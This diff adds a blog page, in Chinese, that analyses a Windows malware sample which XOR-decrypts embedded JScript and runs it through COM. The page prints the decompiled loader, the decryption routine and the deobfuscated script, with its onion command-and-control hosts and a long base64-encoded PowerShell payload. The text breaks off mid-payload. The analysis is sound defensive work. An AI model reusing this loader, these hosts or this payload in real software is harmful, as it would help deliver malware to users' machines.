@@ -1,0 +1,1298 @@
+<!DOCTYPE html>
+<html>
+<head><meta name="generator" content="Hexo 3.9.0">
+  <meta charset="utf-8">
+  
+
+  <link rel="stylesheet" href="https://cdn.bootcss.com/highlight.js/9.12.0/styles/monokai.min.css">
+  <script src="https://cdn.bootcss.com/highlight.js/9.12.0/highlight.min.js"></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/languages/x86asm.min.js"></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/languages/cpp.min.js"></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/languages/Bash.min.js"></script>
+  
+  <script>hljs.initHighlightingOnLoad();</script>
+
+  <title>调用jscript引擎接口的malware分析 | ydc&#39;s blog</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="description" content="文件SHA256: f47717a4ae920921b69e8fd590c7a6353be08cad3cfc1a438c490b38e248d3f7  用IDA反编译代码,入口处函数如下：   主要功能解密jscript代码，通过com调用脚本引擎来执行脚本代码   int __cdecl main(int argc, const char **argv, const char **envp)">
+<meta name="keywords" content="病毒分析">
+<meta property="og:type" content="article">
+<meta property="og:title" content="调用jscript引擎接口的malware分析">
+<meta property="og:url" content="http://shxi.me/posts/6193d55c.html">
+<meta property="og:site_name" content="ydc&#39;s blog">
+<meta property="og:description" content="文件SHA256: f47717a4ae920921b69e8fd590c7a6353be08cad3cfc1a438c490b38e248d3f7  用IDA反编译代码,入口处函数如下：   主要功能解密jscript代码，通过com调用脚本引擎来执行脚本代码   int __cdecl main(int argc, const char **argv, const char **envp)">
+<meta property="og:locale" content="en">
+<meta property="og:image" content="https://i.loli.net/2018/04/22/5adc6990e4707.png">
+<meta property="og:updated_time" content="2020-03-26T06:12:29.353Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="调用jscript引擎接口的malware分析">
+<meta name="twitter:description" content="文件SHA256: f47717a4ae920921b69e8fd590c7a6353be08cad3cfc1a438c490b38e248d3f7  用IDA反编译代码,入口处函数如下：   主要功能解密jscript代码，通过com调用脚本引擎来执行脚本代码   int __cdecl main(int argc, const char **argv, const char **envp)">
+<meta name="twitter:image" content="https://i.loli.net/2018/04/22/5adc6990e4707.png">
+  
+    <link rel="alternative" href="/atom.xml" title="ydc&#39;s blog" type="application/atom+xml">
+  
+  
+    <link rel="icon" href="/img/favicon.png">
+  
+  
+      <link rel="stylesheet" href="//cdn.bootcss.com/animate.css/3.5.0/animate.min.css">
+  
+  <link rel="stylesheet" href="/css/style.css">
+  <link rel="stylesheet" href="/font-awesome/css/font-awesome.min.css">
+  <link rel="apple-touch-icon" href="/apple-touch-icon.png">
+  
+  
+      <link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
+  
+  <!-- 加载特效 -->
+    <script src="/js/pace.js"></script>
+    <link href="/css/pace/pace-theme-flash.css" rel="stylesheet">
+  <script>
+      var yiliaConfig = {
+          rootUrl: '/',
+          fancybox: true,
+          animate: true,
+          isHome: false,
+          isPost: true,
+          isArchive: false,
+          isTag: false,
+          isCategory: false,
+          open_in_new: false
+      }
+  </script>
+</head></html>
+<body>
+  <div id="container">
+
+<script id="__bs_script__">//<![CDATA[
+  document.write("<script async src='http://HOST:3000/browser-sync/browser-sync-client.js?v=2.23.6'><\/script>".replace("HOST", location.hostname));
+//]]></script>  
+    <div class="left-col">
+    <div class="overlay"></div>
+<div class="intrude-less">
+    <header id="header" class="inner">
+        <a href="/" class="profilepic">
+            
+            <img lazy-src="/img/head.jpg" class="js-avatar">
+            
+        </a>
+
+        <hgroup>
+          <h1 class="header-author"><a href="/" title="Hi Mate">Ken</a></h1>
+        </hgroup>
+
+        
+        
+        
+            <div id="switch-btn" class="switch-btn">
+                <div class="icon">
+                    <div class="icon-ctn">
+                        <div class="icon-wrap icon-house" data-idx="0">
+                            <div class="birdhouse"></div>
+                            <div class="birdhouse_holes"></div>
+                        </div>
+                        <div class="icon-wrap icon-ribbon hide" data-idx="1">
+                            <div class="ribbon"></div>
+                        </div>
+                        
+                        <div class="icon-wrap icon-link hide" data-idx="2">
+                            <div class="loopback_l"></div>
+                            <div class="loopback_r"></div>
+                        </div>
+                        
+                        
+                        <div class="icon-wrap icon-me hide" data-idx="3">
+                            <div class="user"></div>
+                            <div class="shoulder"></div>
+                        </div>
+                        
+                    </div>
+                    
+                </div>
+                <div class="tips-box hide">
+                    <div class="tips-arrow"></div>
+                    <ul class="tips-inner">
+                        <li>菜单</li>
+                        <li>标签</li>
+                        
+                        <li>友情链接</li>
+                        
+                        
+                        <li>关于我</li>
+                        
+                    </ul>
+                </div>
+            </div>
+        
+
+        <div id="switch-area" class="switch-area">
+            <div class="switch-wrap">
+                <section class="switch-part switch-part1">
+                    <nav class="header-menu">
+                        <ul>
+                        
+                            <li><a href="/">博客首页</a></li>
+                        
+                        </ul>
+                    </nav>
+                    <nav class="header-nav">
+                        <ul class="social">
+                            
+                                <a class="fl github" target="_blank" href="https://github.com/ydc1992" title="github">github</a>
+                            
+                        </ul>
+                    </nav>
+                </section>
+                
+                
+                <section class="switch-part switch-part2">
+                    <div class="widget tagcloud" id="js-tagcloud">
+                        <a href="/tags/Android/" style="font-size: 10px;">Android</a> <a href="/tags/Far-Manager/" style="font-size: 10px;">Far Manager</a> <a href="/tags/Pwnable/" style="font-size: 20px;">Pwnable</a> <a href="/tags/Reversing/" style="font-size: 16.67px;">Reversing</a> <a href="/tags/hacker/" style="font-size: 13.33px;">hacker</a> <a href="/tags/powershell/" style="font-size: 13.33px;">powershell</a> <a href="/tags/python/" style="font-size: 10px;">python</a> <a href="/tags/爬虫/" style="font-size: 10px;">爬虫</a> <a href="/tags/病毒分析/" style="font-size: 10px;">病毒分析</a>
+                    </div>
+                </section>
+                
+                
+                
+                <section class="switch-part switch-part3">
+                    <div id="js-friends">
+                    
+                      <a target="_blank" class="main-nav-link switch-friends-link" href="http://ydc1992.github.io/">name</a>
+                    
+                    </div>
+                </section>
+                
+
+                
+                
+                <section class="switch-part switch-part4">
+                
+                    <div id="js-aboutme">这人太懒了,没有添加任何信息</div>
+                </section>
+                
+            </div>
+        </div>
+    </header>                
+</div>
+    </div>
+    <div class="mid-col">
+      <nav id="mobile-nav">
+      <div class="overlay">
+          <div class="slider-trigger"></div>
+          <h1 class="header-author js-mobile-header hide"><a href="/" title="Me">Ken</a></h1>
+      </div>
+    <div class="intrude-less">
+        <header id="header" class="inner">
+            <a href="/" class="profilepic">
+                
+                    <img lazy-src="/img/head.jpg" class="js-avatar">
+                
+            </a>
+            <hgroup>
+              <h1 class="header-author"><a href="/" title="Me">Ken</a></h1>
+            </hgroup>
+            
+            <nav class="header-menu">
+                <ul>
+                
+                    <li><a href="/">博客首页</a></li>
+                
+                <div class="clearfix"></div>
+                </ul>
+            </nav>
+            <nav class="header-nav">
+                <div class="social">
+                    
+                        <a class="github" target="_blank" href="https://github.com/ydc1992" title="github">github</a>
+                    
+                </div>
+            </nav>
+        </header>                
+    </div>
+</nav>
+      <div class="body-wrap"><article id="post-c-调用jscript引擎接口的malware分析" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/posts/6193d55c.html" class="article-date">
+      <time datetime="2018-04-22T11:11:34.000Z" itemprop="datePublished">2018-04-22</time>
+</a>
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      调用jscript引擎接口的malware分析
+    </h1>
+  
+
+      </header>
+      
+      <div class="article-info article-info-post">
+        
+
+        
+    <div class="article-tag tagcloud">
+        <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/病毒分析/">病毒分析</a></li></ul>
+    </div>
+
+        <div class="clearfix"></div>
+      </div>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+          
+        <blockquote>
+<p>文件SHA256: f47717a4ae920921b69e8fd590c7a6353be08cad3cfc1a438c490b38e248d3f7</p>
+</blockquote>
+<p>用IDA反编译代码,入口处函数如下：</p>
+<pre><code>  主要功能解密jscript代码，通过com调用脚本引擎来执行脚本代码</code></pre> <body bgcolor="#232323">
+<span style="white-space: pre; font-family: Consolas;  ">
+<span style="color:#73adad">int __cdecl main(int argc, const char **argv, const char **envp)
+</span><span><span>{                                                                                           </span></span>
+  <span style="color:#73adad">JSEngine *v3</span><span style="color:#c0c0c0">; </span><span style="color:#73adad">// </span><span style="color:#00ffff">ST20_4
+  </span><span style="color:#73adad">JSEngine *v4</span><span style="color:#c0c0c0">; </span><span style="color:#73adad">// </span><span style="color:#00ffff">ST18_4
+  </span><span style="color:#73adad">unsigned int i</span><span style="color:#c0c0c0">; </span><span style="color:#73adad">// </span><span style="color:#00ffff">[esp+1Ch] [ebp-14h]
+  </span><span style="color:#73adad">encry_code *a2</span><span style="color:#c0c0c0">; </span><span style="color:#73adad">// </span><span style="color:#00ffff">[esp+20h] [ebp-10h]
+
+<p>  </p></span><span style="color:#f187ff">FreeConsole</span><span style="color:#c0c0c0">();<br>  </span><span style="color:#00ffff">a2 </span><span style="color:#c0c0c0">= </span><span style="color:#ffecbb">operator new</span><span style="color:#c0c0c0">(</span><span style="color:#ababab">8u</span><span style="color:#c0c0c0">);<br>  </span><span style="color:#00ffff">a2</span><span style="color:#c0c0c0">-&gt;size = </span><span style="color:#ababab">0x14C88</span><span style="color:#c0c0c0">;<br>  </span><span style="color:#00ffff">a2</span><span style="color:#c0c0c0">-&gt;js_code = </span><span style="color:#ffecbb">operator new[]</span><span style="color:#c0c0c0">(</span><span style="color:#00ffff">a2</span><span style="color:#c0c0c0">-&gt;size);<br>  </span><span style="color:#ababab">for </span><span style="color:#c0c0c0">( </span><span style="color:#00ffff">i </span><span style="color:#c0c0c0">= </span><span style="color:#ababab">0</span><span style="color:#c0c0c0">; </span><span style="color:#00ffff">i &lt; a2</span><span style="color:#c0c0c0">-&gt;size; ++</span><span style="color:#00ffff">i </span><span style="color:#c0c0c0">)<br>    </span><span style="color:#00ffff">a2</span><span style="color:#c0c0c0">-&gt;js_code[</span><span style="color:#00ffff">i</span><span style="color:#c0c0c0">] = </span><span style="color:#ffecbb">encrypt_code</span><span style="color:#c0c0c0">[</span><span style="color:#00ffff">i</span><span style="color:#c0c0c0">];<br>  </span><span style="color:#ffecbb">decrypt_code</span><span style="color:#c0c0c0">(</span><span style="color:#00ffff">a2</span><span style="color:#c0c0c0">-&gt;js_code, </span><span style="color:#00ffff">a2</span><span style="color:#c0c0c0">-&gt;size - </span><span style="color:#ababab">1</span><span style="color:#c0c0c0">);<br>  </span><span style="color:#00ffff">v3 </span><span style="color:#c0c0c0">= </span><span style="color:#ffecbb">operator new</span><span style="color:#c0c0c0">(</span><span style="color:#ababab">0x10u</span><span style="color:#c0c0c0">);<br>  </span><span style="color:#ffecbb">memset</span><span style="color:#c0c0c0">(</span><span style="color:#00ffff">v3</span><span style="color:#c0c0c0">, </span><span style="color:#ababab">0x10u</span><span style="color:#c0c0c0">);<br>  </span><span style="color:#00ffff">v4 </span><span style="color:#c0c0c0">= </span><span style="color:#ffecbb">init_com</span><span style="color:#c0c0c0">(</span><span style="color:#00ffff">v3</span><span style="color:#c0c0c0">);<br>  </span><span style="color:#ffecbb">run_jscript</span><span style="color:#c0c0c0">(</span><span style="color:#00ffff">v4</span><span style="color:#c0c0c0">, </span><span style="color:#00ffff">a2</span><span style="color:#c0c0c0">);<br>  </span><span style="color:#ffecbb">sub_862F90</span><span style="color:#c0c0c0">(</span><span style="color:#00ffff">v4</span><span style="color:#c0c0c0">);<br>  </span><span style="color:#ababab">return 0</span><span style="color:#c0c0c0">;<br></span><span style="background:#646464"></span><span style="background:#ababab"></span><span><span>} </span></span><br></span></body><p></p>
+<h2 id="jscript代码解密"><a href="#jscript代码解密" class="headerlink" title="jscript代码解密"></a>jscript代码解密</h2><pre><code>    解密方式也比较简单，主要就是通过xor来解密</code></pre><body bgcolor="#232323">
+<span style="white-space: pre; font-family: Consolas; ">
+
+<p><span style="color:#73adad">_BYTE *__cdecl decrypt_code(char *a1, unsigned int size)<br></span><span><span>{</span></span><br>  <span style="color:#ffd200">_BYTE *v2</span><span style="color:#c0c0c0">; </span><span style="color:#ffd200">// </span><span style="color:#00ffff">edx<br>  </span><span style="color:#73adad">_BYTE *result</span><span style="color:#c0c0c0">; </span><span style="color:#73adad">// </span><span style="color:#00ffff">eax<br>  </span><span style="color:#73adad">unsigned int v4</span><span style="color:#c0c0c0">; </span><span style="color:#73adad">// </span><span style="color:#00ffff">[esp+0h] [ebp-1Ch]<br>  </span><span style="color:#ffd200">_BYTE *v5</span><span style="color:#c0c0c0">; </span><span style="color:#ffd200">// </span><span style="color:#00ffff">[esp+10h] [ebp-Ch]<br>  </span><span style="color:#73adad">unsigned int i</span><span style="color:#c0c0c0">; </span><span style="color:#73adad">// </span><span style="color:#00ffff">[esp+14h] [ebp-8h]<br>  </span><span style="color:#73adad">unsigned int j</span><span style="color:#c0c0c0">; </span><span style="color:#73adad">// </span><span style="color:#00ffff">[esp+18h] [ebp-4h]</span></p>
+<p>  v4 </p></span><span style="color:#c0c0c0">= </span><span style="color:#ababab">0x7FFFFFFF </span><span style="color:#c0c0c0">- </span><span style="color:#ababab">8</span><span style="color:#c0c0c0"></span><span style="color:#ffecbb">fun</span><span style="color:#c0c0c0">(</span><span style="color:#00ffff">size</span><span style="color:#c0c0c0">, </span><span style="color:#ababab">6</span><span style="color:#c0c0c0">);<br>  </span><span style="color:#00ffff">result </span><span style="color:#c0c0c0">= </span><span style="color:#ffecbb">operator new</span><span style="color:#c0c0c0">(</span><span style="color:#ababab">1u</span><span style="color:#c0c0c0">);<br>  </span><span style="color:#00ffff">v5 </span><span style="color:#c0c0c0">= </span><span style="color:#00ffff">result</span><span style="color:#c0c0c0">;<br>  </span><span style="color:#00ffff">v2 </span><span style="color:#c0c0c0">= </span><span style="color:#00ffff">result</span><span style="color:#c0c0c0">;<br>  </span><span style="color:#ffecbb">LOBYTE</span><span style="color:#c0c0c0">(</span><span style="color:#00ffff">result</span><span style="color:#c0c0c0">) = </span><span style="color:#ababab">4</span><span style="color:#c0c0c0">;<br>  *</span><span style="color:#00ffff">v2 </span><span style="color:#c0c0c0">= </span><span style="color:#ababab">4</span><span style="color:#c0c0c0">;<br>  </span><span style="color:#ff633c">// 生成xor key<br>  </span><span style="color:#ababab">for </span><span style="color:#c0c0c0">( </span><span style="color:#00ffff">i </span><span style="color:#c0c0c0">= </span><span style="color:#ababab">0</span><span style="color:#c0c0c0">; </span><span style="color:#00ffff">i &lt; </span><span style="color:#ababab">4</span><span style="color:#c0c0c0">; ++</span><span style="color:#00ffff">i </span><span style="color:#c0c0c0">)<br>  {<br>    </span><span style="color:#00ffff">v5</span><span style="color:#c0c0c0">[</span><span style="color:#00ffff">i</span><span style="color:#c0c0c0">] = </span><span style="color:#00ffff">v4 &gt;&gt; </span><span style="color:#ababab">8 </span><span style="color:#c0c0c0">* </span><span style="color:#00ffff">i</span><span style="color:#c0c0c0">;<br>    </span><span style="color:#00ffff">result </span><span style="color:#c0c0c0">= (</span><span style="color:#00ffff">i </span><span style="color:#c0c0c0">+ </span><span style="color:#ababab">1</span><span style="color:#c0c0c0">);<br>  </span><span style="background:#c0c0c0"></span><span style="color:#c0c0c0">}<br>  </span><span style="color:#ababab">for </span><span style="color:#c0c0c0">( </span><span style="color:#00ffff">j </span><span style="color:#c0c0c0">= </span><span style="color:#ababab">0</span><span style="color:#c0c0c0">; </span><span style="color:#00ffff">j &lt; size</span><span style="color:#c0c0c0">; ++</span><span style="color:#00ffff">j </span><span style="color:#c0c0c0">)<br>  {<br>    </span><span style="color:#00ffff">result </span><span style="color:#c0c0c0">= (</span><span style="color:#00ffff">v5</span><span style="color:#c0c0c0">[</span><span style="color:#00ffff">j </span><span style="color:#c0c0c0">% </span><span style="color:#ababab">4</span><span style="color:#c0c0c0">] ^ </span><span style="color:#00ffff">a1</span><span style="color:#c0c0c0">[</span><span style="color:#00ffff">j</span><span style="color:#c0c0c0">]);<br>    </span><span style="color:#00ffff">a1</span><span style="color:#c0c0c0">[</span><span style="color:#00ffff">j</span><span style="color:#c0c0c0">] = </span><span style="color:#00ffff">result</span><span style="color:#c0c0c0">;<br>  </span><span style="background:#00ffff"></span><span style="color:#c0c0c0">}<br>  </span><span style="color:#ababab">return </span><span style="color:#00ffff">result</span><span style="color:#c0c0c0">;<br></span><span style="background:#646464"></span><span style="background:#00ffff"></span><span><span style="color:#c0c0c0">} </span></span><br></body><p></p>
+<p>解密后的jscript代码如下，看得眼瞎。</p>
+<p><img src="https://i.loli.net/2018/04/22/5adc6990e4707.png" alt></p>
+<p>再次解密后代码，还是有点混淆</p>
+<pre><code class="javascript">var CotZ=null;
+var PBPRfNXyqx=null;
+var XVEbnkh=null;
+
+var sZTSiOfmguW = new ActiveXObject(&quot;WScript.Shell&quot;);
+var VTU = new ActiveXObject(&quot;Scripting.FileSystemObject&quot;);
+
+var BINARY_STREAM_TYPE = 1;
+var TEXT_STREAM_TYPE = 2;
+var CREATE_OVERWRITE_SAVE_MODE = 2;
+
+var iOU=sZTSiOfmguW.ExpandEnvironmentStrings(&quot;%TEMP%&quot;);
+var DSoEmfpCHxm=sZTSiOfmguW.ExpandEnvironmentStrings(&quot;%APPDATA%&quot;);
+var hNVJ=sZTSiOfmguW.ExpandEnvironmentStrings(&quot;%COMPUTERNAME%&quot;);
+var dEhkFnrZt=iOU+&quot;\\&quot;+hNVJ+&quot;.log&quot;;
+//base64编码的ps脚本
+var kVQNRMoBaO={
+    LgiwpoajBw: [&quot;yzpayb4sqad7gnin.onion&quot;, &quot;bozuniy4sgprvinf.onion&quot;, &quot;qr5c2etn6x5lhhfc.onion&quot;, &quot;77gxepg2d34nfoid.onion&quot;],
+    oUXMMFdTE: &quot;MIIHFTCCBP2gAwIBAgIJALiLEBQOtPnxMA0GCSqGSIb3DQEBCwUAMIG3MQswCQYDVQQGEwJHQjEbMBkGA1UECBMSR3JlYXRlciBNYW5jaGVzdGVyMRAwDgYDVQQHEwdTYWxmb3JkMRowGAYDVQQKExFDT01PRE8gQ0EgTGltaXRlZDE6MDgGA1UEAxMxQ09NT0RPIFJTQSBFeHRlbmRlZCBWYWxpZGF0aW9uIFNlY3VyZSBTZXJ2ZXIgQ0EgMjEhMB8GCSqGSIb3DQEJARYSc3VwcG9ydEBjb21vZG8uY29tMB4XDTE4MDIxMjEzMDczMVoXDTI4MDIxMDEzMDczMVowgbcxCzAJBgNVBAYTAkdCMRswGQYDVQQIExJHcmVhdGVyIE1hbmNoZXN0ZXIxEDAOBgNVBAcTB1NhbGZvcmQxGjAYBgNVBAoTEUNPTU9ETyBDQSBMaW1pdGVkMTowOAYDVQQDEzFDT01PRE8gUlNBIEV4dGVuZGVkIFZhbGlkYXRpb24gU2VjdXJlIFNlcnZlciBDQSAyMSEwHwYJKoZIhvcNAQkBFhJzdXBwb3J0QGNvbW9kby5jb20wggIiMA0GCSqGSIb3DQEBAQUAA4ICDwAwggIKAoICAQDjuKXVJAXzzO9oNNpRYGGbb/bkGauJ7zZB99z9CCsX3+6IRpBENKqVjAAmjIOfo0amscoQdEPUVm0ZI+5C10vtVpXPe3gFqZI6yQB7zmWCSJWDgwcK89TZSTNixRAlSoQc0gFBxa4/rgMzS+beoSDic3rELtqYslR7paPrmKIYjbchH0M87rLvYnddPSxtKvPNro+ks3Mc1Mtr17kn6UHbNNEPNpSZGseisY3M99JA9Fn9DGEl0OV7EfzjRGctakL0OiITjZtlldVCbBBTqBRhmZwbCo1zi1dY5HyKn62HZGCpPKqVVxjhSQdNKWuvy/PSJwJxOlDdhV8yUT1CQhL1dX40vAEGQZlAf0y6EeAUfSA3uGYVMpXfnApq1IAN3XtMJ78wnzIXWJzDcprmkSjrNyimK3SFUOLNbSlx4An/esbepevEo+QI8jw/N0ASMkWGM0Oj01wZce41ZqP8hNnIu+h+S4htMWdBpTb4uiTPsv9wXpelHn4P1b/70JKQN6G+7n1tfabjI4hQ8ItKgkrcfTZF3Qo8w/hnsV4ngS+DkrvcHCSmdLo8yIwyGegFBFTMpYdXUjJRVitY4Rs5g8zP2k7LJZg9/G/Nx5Ezm2+6PgLaqfJttgQOj5z6tj9UoOvaEzIF4BsymF24N1Q7UKR9xK6GQ6zbKCTjXTTq+DQrHwIDAQABo4IBIDCCARwwHQYDVR0OBBYEFHcsy+p/AAm63Gug/aUpwHeq9rZCMIHsBgNVHSMEgeQwgeGAFHcsy+p/AAm63Gug/aUpwHeq9rZCoYG9pIG6MIG3MQswCQYDVQQGEwJHQjEbMBkGA1UECBMSR3JlYXRlciBNYW5jaGVzdGVyMRAwDgYDVQQHEwdTYWxmb3JkMRowGAYDVQQKExFDT01PRE8gQ0EgTGltaXRlZDE6MDgGA1UEAxMxQ09NT0RPIFJTQSBFeHRlbmRlZCBWYWxpZGF0aW9uIFNlY3VyZSBTZXJ2ZXIgQ0EgMjEhMB8GCSqGSIb3DQEJARYSc3VwcG9ydEBjb21vZG8uY29tggkAuIsQFA60+fEwDAYDVR0TBAUwAwEB/zANBgkqhkiG9w0BAQsFAAOCAgEAe+T5CDZJSbxmSs3wSoPF4T8OAjohchLItLJYjN3qGvkh4hHdYxYFkKnLGJA9BtvX+iv+YzdIxYQNJYuq8QjXsWl/nMIoxhfYwS0ng3GbT/ItBxtVOqtdIPvoL0yRXavyVqx7EX9iJOAaTM/Fh2MDCp3X0yvIf5RMeoG1ZUpfAKUzZVh7rkkNGy6F5b8ZYcjG2b7pjP+jfMROMvrBD07usi+AtDYjloAGJrO5PMoPwd+kuIW2EHzOr8xKpbC9U61bton/eAZ8CRKz/MeBrkQdqpKuxFmtAlo6i2YAVgMBgscGj7PM2EmNmLPyaT3lqjYoFXg5mV9hA3qwjZhrHd4u+qSVHHh5ILAb0GKmbogvGL4Ehlyrq66HbegaxP35hrZgqOFvPcFAxF37dpcqgeT4LDAjrSh972CX5Y9ZtWbcYXnxl+cjcmO/K1ghUdoGVSSh3wXmpFh9sARXjv3yXzerlKFXoz175nMLcQkC69Q/F9ZT7QvSNR+S6nBQvl3YOhcwVYyfiYa3hZHZ4nNqLevK3YxCgmumHJsRbOvAEjMiwcnXttv9+Qhh6KxmCblqRtzqwC+HtMvVfIDqwidesWm48k0Auq2P9ctOjt/qE1b3xUguPOUgw2xJzsWh5fQcWmeU1gZcOageEOH7W+mOD1CVnucnEG2DuOIwEvBQEHANrLI=&quot;,
+    moZgTncSGjjMW: &quot;ZnVuY3Rpb24gUFlaT0lnWFJ7CkFkZC1UeXBlIEAiCnVzaW5nIFN5c3RlbTsKdXNpbmcgU3lzdGVtLlRleHQ7CnVzaW5nIFN5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlczsKdXNpbmcgU3lzdGVtLkRpYWdub3N0aWNzOwp1c2luZyBTeXN0ZW0uU2VjdXJpdHku&quot;+
+&quot;Q3J5cHRvZ3JhcGh5Llg1MDlDZXJ0aWZpY2F0ZXM7CnVzaW5nIFN5c3RlbS5UaHJlYWRpbmc7CgpwdWJsaWMgc3RhdGljIGNsYXNzIEppeFBDVWYKewoJcHVibGljIGNsYXNzIGRhZwogICAgewogICAgICAgIHB1YmxpYyBzdHJpbmcgV25kY2xhc3M7CiAgICAgICAg&quot;+
+&quot;cHVibGljIHN0cmluZyBUaXRsZTsKICAgICAgICBwdWJsaWMgc3RyaW5nIFByb2Nlc3M7CiAgICAgICAgcHVibGljIEludFB0ciBoV25kOwogICAgfQoKICAgIHByaXZhdGUgZGVsZWdhdGUgYm9vbCBIbHNycW92YkxQKEludFB0ciBoV25kLCByZWYgZGFnIGRhdGEp&quot;+
+&quot;OwoKICAgIFtEbGxJbXBvcnQoInVzZXIzMi5kbGwiKV0KICAgIFtyZXR1cm46IE1hcnNoYWxBcyhVbm1hbmFnZWRUeXBlLkJvb2wpXQogICAgcHJpdmF0ZSBzdGF0aWMgZXh0ZXJuIGJvb2wgRW51bVdpbmRvd3MoSGxzcnFvdmJMUCBscEVudW1GdW5jLCByZWYgZGFn&quot;+
+&quot;IGRhdGEpOwoJCglbRGxsSW1wb3J0KCJ1c2VyMzIuZGxsIiwgU2V0TGFzdEVycm9yID0gdHJ1ZSwgQ2hhclNldCA9IENoYXJTZXQuQXV0byldCiAgICBwdWJsaWMgc3RhdGljIGV4dGVybiBpbnQgR2V0Q2xhc3NOYW1lKEludFB0ciBoV25kLCBTdHJpbmdCdWlsZGVy&quot;+
+&quot;IGxwQ2xhc3NOYW1lLCBpbnQgbk1heENvdW50KTsKCiAgICBbRGxsSW1wb3J0KCJ1c2VyMzIuZGxsIiwgQ2hhclNldCA9IENoYXJTZXQuQXV0bywgU2V0TGFzdEVycm9yID0gdHJ1ZSldCiAgICBwdWJsaWMgc3RhdGljIGV4dGVybiBpbnQgR2V0V2luZG93VGV4dChJ&quot;+
+&quot;bnRQdHIgaFduZCwgU3RyaW5nQnVpbGRlciBscFN0cmluZywgaW50IG5NYXhDb3VudCk7CgkKCVtEbGxJbXBvcnQoInVzZXIzMi5kbGwiLCBTZXRMYXN0RXJyb3IgPSB0cnVlLCBDaGFyU2V0ID0gQ2hhclNldC5BdXRvKV0KCXN0YXRpYyBleHRlcm4gdWludCBHZXRX&quot;+
+&quot;aW5kb3dUaHJlYWRQcm9jZXNzSWQoSW50UHRyIGhXbmQsIG91dCB1aW50IGxwZHdQcm9jZXNzSWQpOwoJCglbRGxsSW1wb3J0KCJ1c2VyMzIuZGxsIildCglbcmV0dXJuOiBNYXJzaGFsQXMoVW5tYW5hZ2VkVHlwZS5Cb29sKV0KCXN0YXRpYyBleHRlcm4gYm9vbCBT&quot;+
+&quot;ZXRGb3JlZ3JvdW5kV2luZG93KEludFB0ciBoV25kKTsKCQoJcHVibGljIGRlbGVnYXRlIGJvb2wgS2RVR09HcWZsWEFvKEludFB0ciBod25kLCBJbnRQdHIgbFBhcmFtKTsKCQoJW0RsbEltcG9ydCgidXNlcjMyIildCglbcmV0dXJuOiBNYXJzaGFsQXMoVW5tYW5h&quot;+
+&quot;Z2VkVHlwZS5Cb29sKV0KCXB1YmxpYyBzdGF0aWMgZXh0ZXJuIGJvb2wgRW51bUNoaWxkV2luZG93cyhJbnRQdHIgd2luZG93LCBLZFVHT0dxZmxYQW8gY2FsbGJhY2ssIEludFB0ciBsUGFyYW0pOyAgCgkKCVtEbGxJbXBvcnQoInVzZXIzMi5kbGwiLCBDaGFyU2V0&quot;+
+&quot;ID0gQ2hhclNldC5BdXRvKV0KCXN0YXRpYyBleHRlcm4gSW50UHRyIFNlbmRNZXNzYWdlKEludFB0ciBoV25kLCBVSW50MzIgTXNnLCBJbnRQdHIgd1BhcmFtLCBJbnRQdHIgbFBhcmFtKTsKCQoJW0ZsYWdzXQogICAgcHJpdmF0ZSBlbnVtIFNuYXBzaG90RmxhZ3Mg&quot;+
+&quot;OiB1aW50CiAgICB7CiAgICBIZWFwTGlzdCA9IDB4MDAwMDAwMDEsCiAgICBQcm9jZXNzID0gMHgwMDAwMDAwMiwKICAgIFRocmVhZCA9IDB4MDAwMDAwMDQsCiAgICBNb2R1bGUgPSAweDAwMDAwMDA4LAogICAgTW9kdWxlMzIgPSAweDAwMDAwMDEwLAogICAgSW5o&quot;+
+&quot;ZXJpdCA9IDB4ODAwMDAwMDAsCiAgICBBbGwgPSAweDAwMDAwMDFGLAogICAgTm9IZWFwcyA9IDB4NDAwMDAwMDAKICAgIH0KICAgIC8vaW5uZXIgc3RydWN0IHVzZWQgb25seSBpbnRlcm5hbGx5CiAgICBbU3RydWN0TGF5b3V0KExheW91dEtpbmQuU2VxdWVudGlh&quot;+
+&quot;bCwgQ2hhclNldCA9IENoYXJTZXQuQXV0byldCiAgICBwcml2YXRlIHN0cnVjdCBQUk9DRVNTRU5UUlkzMgogICAgewogICAgY29uc3QgaW50IE1BWF9QQVRIID0gMjYwOwogICAgaW50ZXJuYWwgVUludDMyIGR3U2l6ZTsKICAgIGludGVybmFsIFVJbnQzMiBjbnRV&quot;+
+&quot;c2FnZTsKICAgIGludGVybmFsIFVJbnQzMiB0aDMyUHJvY2Vzc0lEOwogICAgaW50ZXJuYWwgSW50UHRyIHRoMzJEZWZhdWx0SGVhcElEOwogICAgaW50ZXJuYWwgVUludDMyIHRoMzJNb2R1bGVJRDsKICAgIGludGVybmFsIFVJbnQzMiBjbnRUaHJlYWRzOwogICAg&quot;+
+&quot;aW50ZXJuYWwgVUludDMyIHRoMzJQYXJlbnRQcm9jZXNzSUQ7CiAgICBpbnRlcm5hbCBJbnQzMiBwY1ByaUNsYXNzQmFzZTsKICAgIGludGVybmFsIFVJbnQzMiBkd0ZsYWdzOwogICAgW01hcnNoYWxBcyhVbm1hbmFnZWRUeXBlLkJ5VmFsVFN0ciwgU2l6ZUNvbnN0&quot;+
+&quot;ID0gTUFYX1BBVEgpXQogICAgaW50ZXJuYWwgc3RyaW5nIHN6RXhlRmlsZTsKICAgIH0KCiAgICBbRGxsSW1wb3J0KCJrZXJuZWwzMiIsIFNldExhc3RFcnJvciA9IHRydWUsIENoYXJTZXQgPSBTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXMuQ2hhclNldC5B&quot;+
